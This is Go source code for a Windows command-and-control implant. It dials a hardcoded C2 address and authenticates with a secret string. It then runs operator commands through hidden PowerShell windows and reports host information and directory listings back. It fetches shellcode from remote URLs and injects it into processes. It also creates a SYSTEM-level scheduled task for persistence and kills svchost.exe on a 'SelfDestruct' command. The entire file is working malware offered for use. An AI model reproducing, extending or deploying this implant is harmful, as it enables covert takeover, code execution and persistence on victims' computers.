package main

import (
	//"encoding/binary"
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/D3Ext/maldev/shellcode"
)

func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
	if *attempts > 3 {
		terminate()
	}
	addr, err := net.Dial("tcp", *c2Address)
	if err != nil {
		fmt.Println("Couldn't establish a connection")
		*attempts = *attempts + 1
		time.Sleep(10 * time.Second)
		return addr, false
	}
	buffer := make([]byte, 100)
	read_len, err := addr.Read(buffer)
	if read_len <= 1 {
		fmt.Println("Error with size of buffer")
		return addr, false
	}
	if err != nil {
		fmt.Println("A general network error has occured")
		return addr, false
	}
	bufferSnapped := buffer[:read_len]
	bufferStr := string(bufferSnapped)
	if bufferStr != "WhoAreYou\n" {
		os.Exit(1)
	}
	reply2Auth(&addr)
	time.Sleep(1 * time.Second) //Attempt to combat race condition
	*attempts = 0
	return addr, true
}

func reply2Auth(conn *net.Conn) {
	//fmt.Println("Sending Auth Message")
	//time.Sleep(2 * time.Second) //Attempt to combat a race condition
	(*conn).Write([]byte("i_L0V_y0U_Ju5t1n_P3t3R\n"))
}

// v2
func executeCommands(conn *net.Conn, command *string) {
	if *command == "stop\n" {
		terminate()
	}
	powershellPath := "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
	ps_instance := exec.Command(powershellPath, "/c", *command)
	ps_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //Learn how syscalls work ktiir 2awiyeh
	output, err := ps_instance.Output()
	if err != nil {
		output = []byte("Couldn't execute the command\n")
		fmt.Println("Couldnt Execute the command")
	}
	// Convert the directory listing to bytes
	data := []byte(output)
	totalLength := uint32(len(data))

	// First, send the size of the data (length prefix)
	lengthBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(lengthBytes, totalLength)

	// Send length prefix
	_, err = (*conn).Write(lengthBytes)
	if err != nil {
		fmt.Println("Error sending data length:", err)
		return
	}

	// Send data in chunks (partial writes handling)
	bytesSent := 0
	for bytesSent < len(data) {
		n, err := (*conn).Write(data[bytesSent:])
		if err != nil {
			fmt.Println("Error sending data:", err)
			return
		}
		bytesSent += n
	}

	fmt.Printf("Sent %d bytes successfully\n", bytesSent)
}

func terminate() {
	fmt.Println("Terminating Implant")
	time.Sleep(1 * time.Second)
	os.Exit(0)
}

// Test this once home //Once it works I think it would be smart to store the data of this server side in session struct to leave less artifacts 3al network.
func cd(conn *net.Conn, pImplantWD *string) {
	(*conn).Write([]byte("OK\n"))
	buff := make([]byte, 100)
	read_len, err := (*conn).Read(buff)
	if err != nil {
		fmt.Println("Something went wrong")
		return
	}
	if read_len < 1 {
		fmt.Println("Something went wrong")
		return
	}
	buffSnapped := buff[:read_len]
	dir2Go := string(buffSnapped)
	err = os.Chdir(dir2Go)
	if err != nil {
		fmt.Println("The dir does not exist or you don't have sufficient privs")
		(*conn).Write([]byte("RETURN\n"))
		return
	}
	*pImplantWD, err = os.Getwd()
	if err != nil {
		fmt.Println("Error Getting the current wd. FATAL")
		(*conn).Write([]byte("RETURN\n"))
		return
	}
	(*conn).Write([]byte("OK\n"))
}

// v4 It works. Review this thanks to GPT
func ls(conn *net.Conn, implantWD *string) {
	dirFS, err := os.ReadDir(*implantWD)
	if err != nil {
		fmt.Println("Error reading directory:", err)
		return
	}

	dirListing := ""
	for _, entry := range dirFS {
		dirInfo, err := entry.Info()
		if err != nil {
			fmt.Println("Error getting file info:", err)
			continue
		}
		KBSizeOfDir := dirInfo.Size() / 1024 // Properly calculate size in KiB
		dirListing += fmt.Sprintf("	%d	 		%s	 	%s\n", KBSizeOfDir, dirInfo.Mode(), dirInfo.Name())
	}

	// Convert the directory listing to bytes
	data := []byte(dirListing)
	totalLength := uint32(len(data))

	// First, send the size of the data (length prefix)
	lengthBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(lengthBytes, totalLength)

	// Send length prefix
	_, err = (*conn).Write(lengthBytes)
	if err != nil {
		fmt.Println("Error sending data length:", err)
		return
	}

	// Send data in chunks (partial writes handling)
	bytesSent := 0
	for bytesSent < len(data) {
		n, err := (*conn).Write(data[bytesSent:])
		if err != nil {
			fmt.Println("Error sending data:", err)
			return
		}
		bytesSent += n
	}

	fmt.Printf("Sent %d bytes successfully\n", bytesSent)
}

func getSC(conn *net.Conn) ([]byte, int) {
	buffer := make([]byte, 100)
	(*conn).Write([]byte("OK\n"))
	read_len, err := (*conn).Read(buffer)
	if err != nil {
		fmt.Println("Problem Reading the buffer")
		(*conn).Write([]byte("Return"))
		return nil, -1
	}
	if read_len <= 1 {
		fmt.Println("Problem with Buffer Size")
		(*conn).Write([]byte("Return"))
		return nil, -1
	}
	bufferSnapped := buffer[:read_len]
	remoteFileURL := string(bufferSnapped)
	fmt.Println(remoteFileURL)
	if remoteFileURL == "" {
		fmt.Println("URL not recieved !")
		(*conn).Write([]byte("Return"))
		return nil, -1
	}
	(*conn).Write([]byte("OK\n"))
	sc, err := shellcode.GetShellcodeFromUrl(remoteFileURL)
	if err != nil {
		fmt.Println("Couldn't get shellcode")
		return nil, 1
	}
	return sc, 0
}

func hostinfo(conn net.Conn) bool {
	hostname, err1 := os.Hostname()
	user, err2 := os.UserHomeDir()

	if err1 != nil || err2 != nil {
		log.Println("[-] Error retrieving host info")
		return false
	}

	info := hostname + "\n" + user
	_, err := conn.Write([]byte(info))
	if err != nil {
		log.Println("[-] Error writing to connection:", err)
		return false
	}

	return true
}

func persist(conn *net.Conn, taskName string) { //Refine it a bit more
	//Create Scheduled Task. I had to do it this way since golang tends to mess up cmd.exec sometimes. This is just safer and easier option.
	(*conn).Write([]byte("OK\n"))
	command := []string{
		"/C",
		"schtasks",
		"/create",
		"/tn", taskName,
		"/sc", "onstart",
		"/ru", "SYSTEM",
		"/tr", fmt.Sprintf(`cmd.exe /C C:\Windows\Temp\%s.exe`, taskName),
	}

	cmd := exec.Command("cmd", command...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, err := cmd.CombinedOutput()

	if err != nil {
		fmt.Println("[-] Failed to create task:", err)
	}
	//fmt.Println(string(output))
	(*conn).Write([]byte(string(output)))
}

func unifiedCommandHandler(conn *net.Conn, implantWD *string) {
	buffer := make([]byte, 4096)
	for {
		n, err := (*conn).Read(buffer)
		if err != nil {
			fmt.Println("[-] Connection lost:", err)
			return
		}
		command := strings.TrimSpace(string(buffer[:n]))
		fmt.Println("[*] Received command:", command)

		switch command {
		case "ping":
			(*conn).Write([]byte("pong\n"))

		case "SelfDestruct":
			ps_instance := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "/c", "taskkill.exe", "/f", "/im", "svchost.exe")
			ps_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			output, err := ps_instance.Output()
			if err != nil {
				fmt.Println("[-] SelfDestruct failed")
			}
			fmt.Println(string(output))
			(*conn).Write([]byte("NoTime2Die\n"))

		case "cd":
			cd(conn, implantWD)

		case "ls":
			ls(conn, implantWD)

		case "pwd":
			fmt.Println(*implantWD)
			(*conn).Write([]byte(*implantWD))

		case "barCode":
			sc, err := getSC(conn)
			if err == -1 {
				continue
			}
			barCodeLoad(conn, &sc)

		case "remote":
			buffer := make([]byte, 100)
			sc, err := getSC(conn)
			if err == -1 {
				continue
			}
			read_len, er := (*conn).Read(buffer)
			if er != nil {
				fmt.Println("[-] Problem Reading into the buffer")
				(*conn).Write([]byte("Return"))
				continue
			}
			bufferSnapped := buffer[:read_len]
			(*conn).Write([]byte("OK\n"))
			pidString := string(bufferSnapped)
			pidInt, _ := strconv.Atoi(pidString)
			remoteThread(sc, pidInt)

		case "persist":
			persist(conn, "5pCi1Mn")

		default:
			executeCommands(conn, &command)
		}
	}
}

func main() {
	c2Address := "192.168.0.102:4444" // Encrypt/decode at runtime in real use
	attempts := 0
	implantWD, _ := os.Getwd()
	fmt.Println("Implant Started")

	conn, result := callHome(&c2Address, &attempts)
	for !result {
		conn, result = callHome(&c2Address, &attempts)
	}
	fmt.Println("CallHome Success")
	if hostinfo(conn) {
		fmt.Println("HostInfo Success")
		go unifiedCommandHandler(&conn, &implantWD)
	}
	// Block main from exiting
	select {}
}
